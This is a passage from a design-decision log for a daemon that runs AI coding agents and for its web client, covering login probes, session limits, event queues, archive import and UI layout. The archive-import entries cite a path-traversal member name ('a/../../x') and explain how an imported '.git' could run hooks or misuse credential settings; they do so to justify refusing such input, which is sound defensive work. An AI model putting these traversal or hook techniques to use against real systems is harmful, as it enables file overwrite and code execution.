copy — a login that appears to work and changes nothing, arriving through the very
door the vendored preference exists to close. What made it survive review is that
the thing which looked right was the count, which is why the driver asserts the
pair by name. The wider rule underneath is that `available` is about the adapter
while `loggedIn` and `login` are about the CLI under it; conflating the two made a
documented remedy unrunnable.

**Status.** Current

### Q2.206 — Which stream does each CLI answer its login status on?

**Behaviour.** `claude auth status` prints JSON on **stdout**; `codex login
status` prints a sentence on **stderr** and writes nothing to stdout. The stream
is a field in the table rather than an assumption in the reader.

**Why.** Reading the wrong one costs no error anywhere: the probe sees an empty
string, answers "cannot tell", and a signed-in codex reports `status unknown` for
ever. Neither answer is read from an exit code, for the reason claude's entry has
always given — a non-zero exit cannot be told from a crash or a missing binary.
`readLoginAnswer` is pure and owns both formats, so `daemoncheck` asserts
branches no CI machine could otherwise reach, including that "Logged in" is a
substring of "Not logged in" and the negative pattern must therefore be tested
first.

**Measured.** By getting it wrong first: codex was read from stdout and reported
`status unknown` on a session that was signed in.

**Status.** Current

### Q2.207 — Why is the login transcript's 64 KiB cap re-applied after the carry flush?

**Rule.** The bound runs after **every** mutation, the carry flush included, and
the carry goes through `scrub()` like everything else — the replacement chain
lifted out of `sanitize`, which now calls it. The flush is appended **after** the
body text, so a transcript reads in stream order.

**Why.** `LoginRun.append` used to return early on `text === ""` — which is
precisely the shape a chunk that is entirely an unterminated `\x1b]` produces,
since the whole write lands in the carry — so those bytes were appended and then
returned past the only statement that bounds the buffer: raw, with ESC and the C0
range going into a string the client renders in a `<pre>`. A CLI emitting one per
write grew the transcript without a ceiling for the run's 10-minute TTL.

**Status.** Current

### Q2.208 — Why did the login wizard not run on macOS at all?

**Rule.** BSD `script` reads its *own* stdin's termios to copy onto the new pty,
so a pipe there kills the run before the agent is reached. `loginStdio` spawns a
non-interactive flow with `/dev/null` on stdin on BSD; **Linux keeps its pipe
unconditionally**, because util-linux `script` works with one today, an immediate
stdin EOF is a plausible way for it to end the session, and Linux is where this
deploys.

**Why.** `LocalRuntime.login` spawned `script` with `stdio: ["pipe", "pipe",
"pipe"]`, so it exited 1 with `script: tcgetattr/ioctl: Operation not supported
on socket` — identical on claude, so the defect was pre-existing and not codex's,
and invisible because Linux is where this deploys and util-linux's `-qec` form
does not ask. `/dev/null` fixes kimi and codex; claude's flow needs the pipe that
is the problem, so what changed for claude is that the failure is a sentence —
`ui/login.ts` recognises that exact string and says "paste a token instead" —
rather than a `tcgetattr` line in a `<pre>`.

**Measured.** Found 2026-08-07 while verifying codex's login and reproduced
outside the daemon. Confirmed on macOS 2026-08-08, both halves in one run:
`POST /agent-auth/kimi/login` exited 0 with `Logged in to managed:kimi-code.`,
and `POST /agent-auth/claude/login` exited 1 with the `tcgetattr` line, from the
same daemon. Still unverified is whether BSD `script` survives a full 15-minute
device flow with `/dev/null` on stdin — the run that proved the spawn works was
against an already-signed-in kimi, so it finished immediately. Q7.63.

**Rejected.** Taking the pipe away unconditionally, which would fix two agents by
breaking the third.

**Status.** Known limitation

### Q2.209 — Does `available: true` mean an agent can start a session?

**Rule.** No. `available` only ever meant "on PATH", and the login probe parses
`claude auth status`'s JSON rather than its exit code.

**Why.** A logged-out agent reported `available: true` and the person found out
at `502 agent_auth_required`, after a worktree had already been made. The exit
code does track the answer — `claude auth status` exits 1 when logged out — but
exit 1 is then indistinguishable from a crash or a missing binary, so it cannot
be the thing that is read.

**Status.** Current

### Q2.210 — What happens if the wrong `script` form is used?

**Behaviour.** Nothing loud. util-linux takes a shell string after `-qec`; BSD
takes argv after the typescript file; the BSD form on Linux writes a file called
`claude` and records nothing.

**Measured.** `claude auth login` prints the URL wrapped in an OSC 8 hyperlink
and waits on a paste prompt, so it needs the input box and **no inbound port**;
`kimi login` and `codex login --device-auth` are device-code flows and their
input box is never used. A lone `\r` becomes a newline — it means "redraw this
line", and dropping it concatenates every spinner frame into one.

**Status.** Current

### Q2.211 — What answers input posted to a login run that has no stdin?

**Rule.** `POST /agent-auth/login/:id/input` answers `400
login_not_interactive`.

**Why.** It was a silent no-op, which on the one screen where a device code is
typed once reads as a client that sent the code successfully. Whether a run has a
stdin pipe at all is decided by `AGENT_LOGIN[agent].interactiveStdin`, the same
field that decides whether the client draws the box — which is why it is in the
table rather than in either reader.

**Status.** Current

### Q2.100 — How many sessions may be running at once?

**Rule.** Two bounds, kept apart: **64 live**, and **16 creations then one per two
minutes**. Both answer `429`, and the refusal is made *before* the cwd is resolved,
so it costs no filesystem probe. **Resume is deliberately outside both** — putting
an agent back in front of an existing conversation is not manufacturing a session.
They are in memory; `REEMOAT_MAX_LIVE_SESSIONS` and its siblings move them.

**Why.** `create()` had no bound of any kind, and the only thing counting sessions
anywhere was the startup prune — which counts in order to **delete**, keeping the
newest 200 and taking every other transcript with it at the next boot. So the sole
consequence of creating sessions without limit was that somebody else's
conversations disappeared. `sqlite.ts`'s own comment beside that cap had already
written the precondition down — *"with one person there is nobody to take it
from"* — and a grant is exactly what makes that false. Both bounds are needed
rather than one: the ceiling bounds what is *running*, while the burst bounds
create-and-stop, which never touches the ceiling and still writes every row the
prune later deletes.

**Status.** Current

### Q2.101 — What bounds an agent's stderr before there is an event to bound?

**Rule.** 64 KiB per line without a newline, flushed as its own line past that.

**Why.** The accumulator in `pumpStderr` had no ceiling, and every bound downstream
of it is on the *event* — which does not exist until a line does. An agent writing
without a newline therefore grew a string that nothing in the system measured, past
the per-event cap, past the per-session byte budget and past the queue's own byte
ceiling, none of which had anything to charge.

**Status.** Current

### Q2.102 — What happens when two consumers want the same event queue?

**Rule.** Ownership of `EventQueue` is a checked monotonic claim rather than an
assumption. Taking a claim wakes the previous holder with `null`, and `next()`
answers `null` for a claim that is no longer current, so a reader already resumed
cannot take one more event on its way out. A turn outranks a drain — `claimForIdle`
refuses while a turn holds it — and **nothing displaces a turn**: `claimForTurn`
refuses rather than displacing. `release` is identity-checked.

**Why.** `next()` used to park its resolver in `waiting` unconditionally, so a
second consumer silently overwrote the first and the displaced one never settled —
a **hang** rather than a mismatch, and a hang inside `harness` or the Session-level
drivers. The asymmetry is not tidiness: a `claimForTurn` that displaced instead of
refusing can strand the hold with no owner able to clear it, which silently returns
the session to buffering — the very state the idle drain exists to end. And a stale
`release` under a live turn would route that turn's events to the drain, park its
generator and pin `ManagedSession.turn`, i.e. `409 turn_in_flight` for the rest of
the session's life.

**Status.** Current

### Q2.103 — Can a cancel arrive before the prompt it is meant to stop?

**Rule.** Yes, and it is honoured rather than overtaken. `pump` tests the cancel
marker *after* reading a prompt's attachments and writes its own
`turn_end{cancelled}`.

**Why.** `prompt()` sets `turn` synchronously, but `Session.turnActive` is not set
until `pump` first pulls the generator — and reading an inlined image's bytes is a
real `readFile` between the two. A cancel landing in that window reaches an agent
holding no prompt, which every adapter discards, and the loop would then send the
message anyway: the turn somebody stopped runs to completion. The daemon writes the
`turn_end` itself because the agent never gets to send one, and a prompt with no
turn end at all is the shape this codebase calls a message that reached no model.

**Status.** Current

### Q2.104 — What does `Session.EventQueue`'s 2000-event bound still protect?

**Decision.** 2000 events, evicting only `agent_log` and `other`, and never
drop-oldest — dropping `text` or `file_change` yields a contiguous log that is
missing content. What it *bounds* is now narrow: the gap between `adopt` and
`onStarted`, plus any bare `Session` — `harness`, the Session-level drivers — where
nothing drains between turns at all.

**Why.** With `ManagedSession.startIdleDrain` attaching a reader between turns, the
thing this cap used to bound is no longer reachable through a managed session: the
agent talking after its turn ended is drained rather than buffered. The number is
kept rather than lowered because the two remaining windows are real, and kept rather
than raised because the eviction policy — not the size — is what makes an overflow
survivable.

**Measured.** Before the drain: 57 events held for 295 s on one session, with
content past 2000 silently evicted through the head placeholder. Q2.44.

**Status.** Current

### Q2.105 — Why does the registry still append permission events now that the queue drains between turns?

**Decision.** The rule is unchanged — the registry appends permission events, not
`session.ts` — and its reason is not.

**Why.** The reason recorded at Q5.57 was that `Session`'s `EventQueue` drains only
while a prompt generator is being consumed, so an event pushed there outside a turn
is stranded. A `ManagedSession` no longer permits that, so the old argument has
lapsed. What replaces it is stronger: `settle()` appends **synchronously**, in the
statement after the agent's own promise is resolved, so routing a
`permission_request` through the queue would put a microtask between the two — and a
client answering inside that microtask could beat its own request into the log.

**Status.** Current — supersedes the reasoning given at Q5.57, which the drain made
obsolete.

### Q2.106 — Does codex resume a conversation end to end, or only advertise that it can?

**Behaviour.** End to end. `codex-acp` 1.1.9 advertises `sessionCapabilities.resume`
— which `AcpClient.supportsSessionResume` reads — and it was measured under the
daemon rather than only off the handshake: a session restarted by the daemon
answered a question about its own earlier turn.

**Why it is recorded.** The claim "all three agents implement `session/resume`" is
what `autoResumable` and the whole boot pass rest on, and Q2.1's measurement covers
claude and kimi only. Advertising a capability and honouring it are different facts
here — the same distinction kimi's plan-mode `-32603` makes (Q2.8) — so the third
agent's is written down separately.

**Status.** Current

### Q2.107 — Code arrives as an archive. Where does the containment argument come from?

**Question.** `POST /fs/import` takes a `.zip` or `.tar.gz` and unpacks it into a
directory somebody picked. Every other path in this daemon deals in paths a person
chose out of a listing of what already exists. An archive member is a string a
remote party wrote, used to create a file. What authorises the write?

**Decision.** Nothing does, and that is the point — the argument is **refusal
first, and it is purely syntactic**.

`paths.ts` already says this in as many words: `atOrUnder` "is correct only where
the path is ours and merely not created yet, and nothing may use it to authorise
an action on a path somebody else chose." `atOrUnderReal` — the primitive that
would have been reached for here — was deleted with its last caller rather than
kept, precisely so that a future caller would have to make this argument instead of
inheriting one.

So `safeMemberPath` is pure, touches no filesystem, and runs before anything is
created. It refuses NUL and control characters, a backslash (a member path is POSIX
or it is refused, never translated), a leading `/` or a drive prefix, any `..`
segment, `.git`, and anything past a depth or length bound. **Both readers go
through it**, which is what stops zip and tar drifting into disagreeing about what
is safe — the failure that would otherwise be found one format at a time.

**`..` is refused rather than normalised**, and that is the whole of the zip-slip
answer. A member reading `a/../../x` is not asking for `x`, it is probing for
whether this code normalises; every surviving zip-slip works by the check running
on the pretty form and the write running on the raw one. There is no pretty form.

**The filesystem half adds exactly one thing: `O_EXCL`.** Every member is written
`"wx"`, the flag `Uploads.receive` already uses, which never follows a link and
never truncates. A link planted between the check and the write is an `EEXIST`.

**Measured.** `daemoncheck` builds both formats itself — shelling out would not
have worked, since GNU tar refuses to *write* a `../` member at all, which is
exactly the member worth being sure about. Every refusal is asserted in a pair: the
refusal, and that nothing at all was created, staging directory included.

**Status.** Current

### Q2.108 — Why is a `.git` inside an archive refused, when cloning a hostile repository is accepted?

**Question.** `CLAUDE.md` is explicit that git hooks run as you and that this is
the intent: "Cloning a hostile repository is exactly as dangerous here as in your
own terminal — and no more." An imported `.git` is the same bytes. Why treat it
differently?

**Decision.** Refused, because the sentence above has a clause that does not
survive the move: *in your own terminal*. The danger there is one you initiated and
are watching.

The daemon runs `git worktree add` on the directory somebody picks, and `git.ts`
deletes `GIT_NO_EXEC_CONFIG` on purpose so that a repository's own `post-checkout`
and its LFS smudge filters run. For a repository you cloned, that is correct and
was measured — neutralising it checked out LFS pointer files instead of content.
For an imported one it makes "upload a file" mean "the daemon executes what was in
that file", with no agent in between and nobody on screen. Every other route to
executing a hostile repository in this system goes through the agent, which is the
thing a person is watching.

**Nothing legitimate is lost**, which is what makes this cheap rather than a trade:
the export skill excludes `.git` anyway, and somebody who wants history asks the
agent to clone — the existing path, on screen while it happens.

**Rejected.** Allowing it and stripping `hooks/`. That is a second, weaker rule
about the same directory, and `.git/config` still carries `credential.helper` and
`core.sshCommand`.

**Reversible, and deliberately so.** It is one clause in `safeMemberPath`, and
`webcheck` pins the export skill against it so the two cannot come to disagree —
a skill that packed a `.git` would produce an archive refused *whole*, and the only
symptom would be a 400 at the end of the slowest step somebody takes.

**Status.** Current

### Q2.109 — An import writes into a directory the daemon does not own. What may it not do to it?

**Question.** This is the only route that creates files inside a folder somebody
else made. What happens when it fails halfway?

**Decision.** Nothing in the target is touched until one `rename`. Extraction goes
to `<target>/.reemoat-import-<random>/tree/`, so a failure at any point leaves the
folder exactly as it was.

**Staging sits inside the target rather than beside the worktree and upload roots**,
for two reasons that are both requirements rather than preferences. The `rename` is
then within one filesystem by construction, where a root under `~/.reemoat` would
be an `EXDEV` copy for anybody whose projects live on another volume. And a third
remover tree would owe `scripts/daemon.ts` a proof that it nests with neither of
the other two (Q5.74) — a startup refusal that is currently a two-way check.

It also buys the thing that makes the rest of the file ordinary: **because the
daemon created the staging directory, every path below it is one it made**, so the
rule about bounding filesystem calls through `stall.ts` — which is about paths
somebody else named — does not apply below that line. `resolveCwd` on the target is
the bounded half.

**The destination is `lstat`ed before the rename, and anything there at all is
refused.** Measured on macOS: `rename(2)` answers `ENOTDIR` for a destination that
is a file or a symlink, `ENOTEMPTY` for a non-empty directory, and **succeeds for
an empty one** — implicitly `rmdir`ing it. That loses no data and is still a
removal of a directory this daemon did not create, which is exactly what it may not
decide to do. The errno mapping below the check is the backstop for the race, not
the rule.

**Known limitation.** A daemon restart mid-import leaves a `.reemoat-import-*`
directory behind. It is dot-prefixed so the picker hides it and named
unmistakably; sweeping directories the daemon does not own would be worse than the
defect.

**Status.** Current

### Q2.110 — Two archive formats. What did each actually cost?

**Question.** Zip is what Finder's Compress and Windows' "Send to" produce; tar.gz
is what the export skill writes and is the better archive. Accepting both means two
readers. What was not obvious?

**Decision.** Both, chosen by **magic bytes rather than by filename** — a filename
is the least reliable thing in the request. Five things cost a measurement:

**A zip states every member twice and the copies may disagree.** Only the central
directory is read. Every extractor ever walked past a check was walked past it by
validating one copy and reading the other; the local header is consulted for
exactly one thing, its own name and extra lengths, being the only way to know where
the data starts.

**The zip64 extra field is positional.** Its members are present only when the
corresponding 32-bit field is saturated, always in the same order. Reading it at
fixed offsets yields a garbage offset out of a valid archive — the first draft did
this and it was caught by reading it back rather than by a test.

**A zip name without general-purpose bit 11 is CP437, and is refused.** Decoding it
as UTF-8 anyway turns undecodable bytes into U+FFFD and collapses distinct names
onto one — a check passing on one string while a file is created at another. Pure
ASCII is identical in both, so only a genuinely ambiguous name is refused.

**pax headers are read, not refused.** macOS ships bsdtar, which writes typeflag
`x` ahead of members whose metadata does not fit the 1979 layout, routinely rather
than rarely. Refusing them refuses most archives made on a Mac.

**`__MACOSX/` is skipped.** Finder writes a parallel resource-fork tree beside the
folder it compressed, so *every* zip made that way has two top-level directories —
which would fail the single-root rule and refuse the most likely archive there is.

**And one that is about Node rather than about archives.**
`handle.createReadStream` per member registers a `close` listener on the shared
`FileHandle` and releases none until the import ends, so a zip of twenty thousand
members registers twenty thousand. Node warns at eleven, which is how it was found
— from `daemoncheck`'s output, on an archive of eleven files. `readRange` reads
positionally and has no such bookkeeping.

**Status.** Current



### Q2.212 — A plugin child is not detached and nothing reaps it. Why is that not the gap it looks like?

**Decision.** A plugin's child process is spawned **without** `detached`, no pid
is recorded, and there is no reaper. `runner.ts` exits when its IPC channel
closes, and that is the whole of plugin cleanup.

**Why it is the opposite of an agent's.** An agent is spawned `detached` because
`claude-agent-acp` runs the CLI as its own child and cleans up only on
`process.on("exit")`, which does not run under SIGKILL — so the process *group* is
the only thing that can be killed reliably. That is why `sessions` has a pid
column, why the reaper exists and why it is fenced by `os.uptime()`: a pid
recorded before a reboot names somebody else's process afterwards.

A plugin has none of those problems. It spawns nothing, holds no conversation, and
its channel dies with the daemon — gracefully or not. A daemon that crashes leaves
children whose `disconnect` fires, and they go. The next daemon start spawns fresh
ones from the rows.

**What this means for a change.** If a plugin ever needs to outlive the daemon —
it should not — the pid column, the fence and the reaper all come back with it,
and this entry is where the argument for the current shape is.

**Status.** Current

## The web client

### What the client is

#### Q3.1 — What is the web client, and did it replace the terminal client?

**Decision.** `packages/web` is a plain React + Vite + Tailwind SPA, built to
static files by `pnpm web:build` and served by the control plane at `/`. There is
no Electron, no service worker and no push. `scripts/client.ts` remains, still as
the regression driver for the terminal, but it is no longer the only way in.

**Why.** The web UI is how the system is actually used; the terminal client's
remaining job is to be a reference implementation of the token and replay logic
that the browser mirrors.

**Status.** Current

#### Q3.2 — How does the screen answer "does anything anywhere need me"?

**Decision.** The answer travels *with the rows* rather than living in a mode
that has to be entered. A session waiting on a human says so on the status dot
every row already carries — amber, haloed, the loudest static thing in the list —
and shows what it is waiting for instead of its path. Its machine's header
carries the count, *in place of* the live count rather than beside it.

**Why.** Because the signal is on the row, the answer is true under every filter,
and approving is two taps from open with the command or diff on screen — never a
wall of transcript to scroll past first.

**Status.** Current

### Nothing in a row mounts sideways

#### Q3.3 — Why is there no warning triangle in front of the status dot?

**Decision.** The triangle is deleted. The dot and the subline already say a
session is waiting; a third glyph said it again.

**Why.** It was the only one of the three that *moved* anything: mounting it
pushed the dot, the name and the subline 21px right, at exactly the moment the
row mattered most. The general rule the screen now follows is that **nothing in a
row mounts sideways into another control.** Two shapes of the problem kept
recurring — a glyph that appears when a session becomes interesting (the
triangle; the pin beside a session's name), and a readout whose *own* width
changes (the context percentage at `9% → 10%`).

**Status.** Current

#### Q3.4 — When something in a row can change width, which of the three remedies applies?

**Decision.** *Delete it* when the thing is redundant — the triangle said what the
dot and the subline already said, so it is gone rather than reserved. *Reserve its
slot* when it is the only copy — the pin, the home spinner and the `Toggle`
spinner each get a fixed box sized by exactly what it holds, drawn empty
otherwise. *Move it off the row* when it is neither redundant nor fixed-width —
the context percentage went into a popover.

**Why.** The choice between the three remedies is the interesting part; a single
blanket remedy would reserve space for redundant things and leave genuinely
variable ones unfixed.

**Rejected.** A widest-label constant. Because the ring left behind by moving the
percentage off the row is one width at every value, there is deliberately **no**
such constant anywhere — looking for one is looking for something that was
considered and rejected.

**Status.** Current

#### Q3.5 — Which mounting glyphs actually displace anything?

**Decision.** Measured rather than assumed: a mount only displaces what lies
between it and the nearest `flex-1` sibling.

**Measured.** The spinner in the home header displaces nothing; the pin beside a
session's name displaces the name.

**Why.** Reserving a slot costs layout and code, so it is spent only where a mount
really moves a neighbour.

**Status.** Current

#### Q3.6 — Why do centred things in the transcript slide left when a card is expanded?

**Decision.** The cause is the scrollbar, not anything in a row. `index.css` sets
`scrollbar-width: thin` under `@media (pointer: fine)`, which is a bar that takes
layout width rather than one that floats over the content the way a phone's does.

**Why.** A box crossing from fitting to not fitting loses about eight pixels of
`clientWidth`, and everything *centred* inside it re-centres by half of that. In
the transcript the trigger is expanding a tool call or a subagent card: it adds
height, height crosses the threshold, and the control at the top, the turn-end
line, a gap marker, the context-cleared divider and the right-hand edge of every
message bubble all slide left together while nothing left-aligned moves at all.
That asymmetry is what made it hard to place — it reads as *some* things shifting.

**Status.** Current

#### Q3.7 — How is the scrollbar shift fixed, and why not globally?

**Decision.** Reserve the gutter: `scrollbar-gutter: stable`, applied as
`.scroll-stable` on the three boxes whose width other things are measured against
— the transcript, and `AppShell`'s two panes. The one row that was centred for no
reason, the control at the top of the transcript (a `w-full` `<button>` inheriting
the UA's `text-align: center`), is left-aligned instead.

**Why.** This is a fourth remedy belonging beside the other three. It is not
applied to `*`, which would also pad the inside of every popover and every `<pre>`
in a tool card, where nothing is centred and there is nothing to steady. The
button is left-aligned rather than gutter-stabilised because two mechanisms for
one property is one too many.

**Status.** Current

#### Q3.8 — Which sideways-mount survivors were found by review, and how were they fixed?

**Decision.** Two, fixed the third way and the second. The `cached token` badge
folded into the machine header's single trailing slot (`machineSubline`), and a
session row's `shortDuration` readout got a fixed right-aligned slot.

**Why.** `machineSubline` is also where the precedence between waiting /
unreachable / cached-token / live now lives, asserted rather than written as a
ternary. `2m` → `59m` → `1h` → `3d` changes character *count*, which
`tabular-nums` does not cover, because that fixes the width of a digit and not how
many there are.

**Status.** Current

#### Q3.9 — Should an unreachable machine still show "2 waiting"?

**Decision.** Yes. `machineSubline` keeps `blocked` above `offline`.

**Why.** The alternative was argued: an unreachable machine showing `2 waiting`
invites a tap that cannot succeed. It stays because the header's own `Dot` is
keyed on `reach` and still says offline beside it, so nothing is actually lost —
while a hidden approval is the one failure this screen exists to prevent.

**Status.** Current

### The session list

#### Q3.10 — How is the fleet's session list organised?

**Decision.** Sessions are grouped by machine, in collapsible sections, each with
"new session here". Above them all sits **Pinned**, one group across the whole
fleet.

**Why.** A pin means "this one, wherever it lives", and one pinned row scattered
per section is a list that has to be reassembled by eye.

**Status.** Current

#### Q3.11 — Does pinning a session move it out of its machine's section?

**Decision.** Yes. Pinning **moves**: `place` in `store.ts` pushes to `pinned` and
returns `null`, so a pinned row is drawn once, in the Pinned group, carrying its
own path.

**⚠ This has now been argued in both directions and the middle position is the one
that lost.** It copied, and the reasoning was that lifting the row out made the
session you were working in disappear from the list you had been finding it in all
day — "the two lists mean different things: the pinned group is *wherever it lives,
here it is*, the section is *what is on this machine*."

**Why that was wrong.** Both lists are on **one screen at one time**, a few hundred
pixels apart, with the pinned group directly above the folders. So the copy was
never a second place to look — it was the same row drawn twice, and a bookmark
whose entire job is "this one, not the other forty" was drawing itself as two of
the forty. Reported from a phone, where the rail is the whole screen and the
duplication is at its most obvious.

**What the copy was protecting is answered instead by `showPath`.** The second
copy said where the session works, and that is a real thing to lose — so the
pinned row draws its own path now, which it did not while a copy under the folder
was saying it. One row, both facts.

**And nothing is hidden.** `waitingFloor` counts by **subtraction** — everything
blocked, minus everything this view draws — and it draws `pinnedFor`, so a blocked
pinned row is on screen either as itself or in the floor's count, asserted as a
superset property over every filter × tab × needle rather than left to this
paragraph.

**Status.** Reversed an earlier decision

#### Q3.12 — What follows from a session appearing in two places at once?

**Decision.** `blockedCount` is counted off what `place` **returned**, so a pinned
row does not count toward its folder's header. `visibleRows` still **deduplicates
by key**.

**Why the count is keyed on the return value.** A header's "N waiting" is a promise
about the rows under *that header*, and a folder saying "1 waiting" that opens onto
nothing waiting is how people learn to stop believing the number — strictly worse
than the number being smaller. This line has now been right for both reasons in
turn: it was a correction while a pinned row was not under its header, was simply
the ordinary answer while pinning copied, and is a correction again. The `liveCount`
disagreement is a separate one and remains: that count comes from `countByMachine`
and includes pinned rows.

**Why the dedup stays with nothing left to deduplicate.** `keyboard.ts` locates the
current row with `findIndex`, and two entries for one session made `j` from the
section copy jump to whatever followed the pinned copy — a jump across the whole
list rather than an off-by-one. Nothing produces a duplicate today. It is two lines,
and what it defends against is the *next* group to copy rather than the one that
used to; `visibleRows` is documented as an order over *sessions* for that reason.

**Status.** Current

#### Q3.13 — How is "an approval cannot be hidden" preserved once sections can collapse?

**Decision.** `blockedCount` sits on each section header, so a *collapsed* machine
still says how many rows under it are waiting, and blocked rows sort first inside
their own section. `pnpm webcheck` asserts both.

**Why.** This replaced an earlier arrangement in which everything blocked was
lifted into a flat zone at the top. The earlier zone made the property
structural; a badge makes it visible, which is the trade that was asked for.

**Status.** Reversed an earlier decision

#### Q3.14 — Why is there no "Needs you" filter?

**Decision.** There is none, deliberately. The remaining three filters (Active /
Ended / All) are slices, and they live in one full-width dropdown.

**Why.** A filter is a mode, and a mode is a bad place to answer "is anything
waiting" — it has to be entered first. The dropdown replaced a chip row that
wrapped in the rail and scrolled sideways on a phone.

**Status.** Current

#### Q3.15 — Why is there no search box in the session list?

**Decision.** It was deleted, and the comment where it stood records why it must
not come back in the same shape.

**Why.** It appeared above seven sessions and matched machine, agent, cwd and raw
session id — deliberately *not* `snapshot.title`, so the one string on a row a
person actually reads was the one thing it could not find. The bigger reason is
structural: it was component-local `useState` while collapse and the filter are
module state in `groups.ts`, for the documented reason that `visibleRows` is the
single source of render order and `keyboard.ts` walks it. The query never reached
it, so with a search active `j`/`k` stepped onto rows the rail was not drawing —
precisely the failure `groups.ts` and `keyboard.ts` each carry a paragraph
claiming is structurally impossible. Anything that filters this list belongs
beside the filter.

**Status.** Current

#### Q3.16 — In what order are machine sections drawn, and where does collapse state live?

**Decision.** Sections are ordered **by name and never by reachability**. A
machine with no sessions still gets a section. Collapse state is module state
seeded from `localStorage`, not `useState`.

**Why.** `reach` flickers, and a list that reorders itself while a thumb is
already travelling toward a row is the one thing this cannot do. An empty
machine's section is what gives it a create button, and what let the read-only
`Machines` list that used to sit at the bottom of the scroll be deleted rather
than merely moved. The phone's list → detail → back unmounts the list, and a
sidebar that re-expands every time a session is read is worse than one that never
collapsed.

**Status.** Current

#### Q3.17 — Why is there no back button?

**Decision.** There is none. The leading control is a close, it always goes to the
list, and it is hidden at `lg`.

**Why.** The back button called `history.back()`, so the arrow went wherever the
reader happened to have been — a session already left, the settings screen, or out
of the app on a fresh load. An app with one list and one detail view has no
history worth replaying; it has a place to return *to*. At `lg` the rail already
shows the list, so the button would send somebody somewhere they can see they
already are.

**Status.** Current

#### Q3.101 — Which list does the orphan section render from?

**Rule.** `orphansFor(groups, filter)`, the same function `visibleRows` calls —
beside `pinnedFor`, which already worked this way. Those two are the exported slices
the JSX is obliged to use.

**Why.** "`visibleRows` is the single source of render order, shared with
`keyboard.ts` so `j` cannot land on a row nobody can see" was **aspirational for one
section**. `visibleRows` had filtered orphans since an ended one appeared in the
Active list; `SessionBrowser` went on rendering `groups.orphans` raw. So "No longer
granted" drew rows the single source excludes: `keyboard.ts` locates the caret with
`findIndex(row.key === currentKey)`, which answers `-1` for such a row, so `j` jumped
to the top of the fleet — and under the Ended filter the section drew live rows.
This is the failure the rule claims is structurally impossible, in the one place
nothing made it so.

**Consequence.** The "No longer granted" heading disappears when every orphan is
filtered out, which is the rule every other section already follows; the rows return
under All.

**Measured.** `webcheck` asserts `orphansFor` under all three filters *and* that
whatever it returns is exactly what `visibleRows` carries on every filter — reverting
`visibleRows` to push the raw group fails the Active and Ended arms. The JSX half is
reachable only by reading `SessionBrowser.tsx` off disk: it must match
`orphansFor(groups, filter)` and must not match `groups.orphans`.

**Status.** Current

### Transport, waking and the shell

#### Q3.18 — Does session data route through the control plane's API?

**Decision.** Never. The client holds one bearer credential — a session token, or
an API key, which is still accepted — sends it *only* to
the control-plane origin, and mints a short-lived token per machine; those tokens
are the only thing a daemon or the relay ever sees.

**Why.** It keeps the long-lived credential on exactly one origin and out of every
per-machine request.

**Status.** Current

#### Q3.19 — What happens when the phone wakes?

**Decision.** One `resume()` in `store.ts`: refresh tokens, re-probe routes,
re-list sessions, reconnect sockets — per machine and independently. Replay is
exactly-once off a single `lastAppliedSeq` per session, and a socket's lifetime is
bounded by its token with the client rotating first.

**Why.** Doing it per machine and independently means one machine that is switched
off never blanks the list or stalls another.

**Status.** Current

#### Q3.20 — Is the client phone-only?

**Decision.** No — it is adaptive. Below `lg` it is one screen at a time,
list → detail. At `lg` and above the same list becomes a permanent left rail
beside the content. `AppShell` is the only place that knows, and it knows in CSS.

**Why.** On a desktop several agents are being watched at once, and having to
leave the one being read to check whether another needs attention is the problem
this exists to solve. There is no breakpoint state in JavaScript, so a resized
window cannot end up rendering a rail that is not there — and `SessionBrowser`
renders in both, so "blocked first" cannot be true in one and false in the other.

**Status.** Current

#### Q3.97 — Can the app leave the loading screen without `bootstrap` having finished?

**Decision.** Yes, and it has to. `runResume` promotes `phase` from `loading` to
`ready` when `cp.machines()` **succeeds**, and fires `refreshMe()` at the same
moment.

**Why.** `phase` was written by `bootstrap` and `handleSignedOut` alone, and
`bootstrap` runs once at page load. A tab opened while the control plane was down
went to `loading`, then rebuilt connections, tokens, daemons and the poll on the
`cp-retry`/wake path — and rendered `App`'s bare spinner for ever with `cpError`
cleared by that same patch, so there was no message and no way out but a reload. It
was worse than a stalemate: the retry gate keys on `phase === "loading"`, so it fired
`GET /v1/machines` every four seconds for ever, which is precisely the poll nobody
asked for that the gate exists to prevent.

**On success, never on "returned rows".** The first version gated promotion on
`connections.size > 0`, mirroring `bootstrap`'s *catch* arm. But this is the success
path, and an account with zero machines — a fresh user, or one whose machines were
all revoked — has a perfectly usable app: `bootstrap`'s own success arm says so by
patching `ready` unconditionally. Gating on rows stranded exactly the person who
needs Settings → Machines, the screen that took the admin off the critical path for
every machine in the fleet.

**Why in `runResume` rather than in the retry branch.** A wake landing first creates
the connections, which would make that branch's `connections.size === 0` guard false
for ever.

**Consequence.** The app can reach `ready` by a path `bootstrap` never completed, so
`me` arrives one request later and `visibleSections` hides admin sections for that
moment — a state `bootstrap`'s catch arm already reaches, which is why `refreshMe`
goes with the promotion. Promotion is only ever *upwards* out of `loading`, so a
signed-out tab is untouched.

**Status.** Current

#### Q3.98 — What happens when a URL will not decode?

**Rule.** `decodeSegment` returns the segment as written on a `URIError`. All three
call sites in `parse` use it.

**Why.** `parse` runs in the module body — `let current =
parse(window.location.pathname)` — so a bare `decodeURIComponent` on a segment
holding a lone `%` threw during module *evaluation* and the bundle never mounted.
What that is on a phone is a blank page with no console, unfixable by reloading. A
segment that will not decode is still a usable string; it matches no machine and no
session, so the route falls through to home. Nothing this app builds goes near it —
`sessionPath`/`newPath` always `encodeURIComponent`.

**Measured.** `webcheck` sets `window.location.pathname` to `/m/m_1/s/s_1%` and then
dynamically imports `router.ts`, so **the import is the assertion**: reverting makes
the module body throw and the leading `report` prints FAIL with the `URIError`. It is
a `report` rather than a `check` so the sections below stay reachable. `/%` was
deliberately not used as a fixture — it routes home without decoding and passes
either way.

**Status.** Current

#### Q3.99 — Does a stale 401 sign you out?

**Rule.** No. `cpFetch` captures `const sent = credential` before building the
header and tears the session down only while `credential === sent`.

**Why.** `CP_TIMEOUT_MS` is ten seconds, which is ample for a request sent with an
expiring token to answer *after* a wake has signed out, a fresh sign-in has
succeeded and `bootstrap` has rebuilt the fleet. The old 401 then cleared the
brand-new token from memory and `localStorage` and returned the tab to the gate
saying the session had expired — about a session that was perfectly good and, no
`DELETE /v1/me/sessions/current` having been sent, then lingered to its full
thirty-day expiry. `setSession` always allocates, so identity is the whole
comparison.

**Consequence.** A refusal of a credential that is no longer current is swallowed as
a *signal* only; it still throws to the caller, which shows its own error. The only
way to be in that state is to have replaced the credential in the meantime, which is
exactly when signing out is the wrong answer.

**Status.** Current

### The transcript

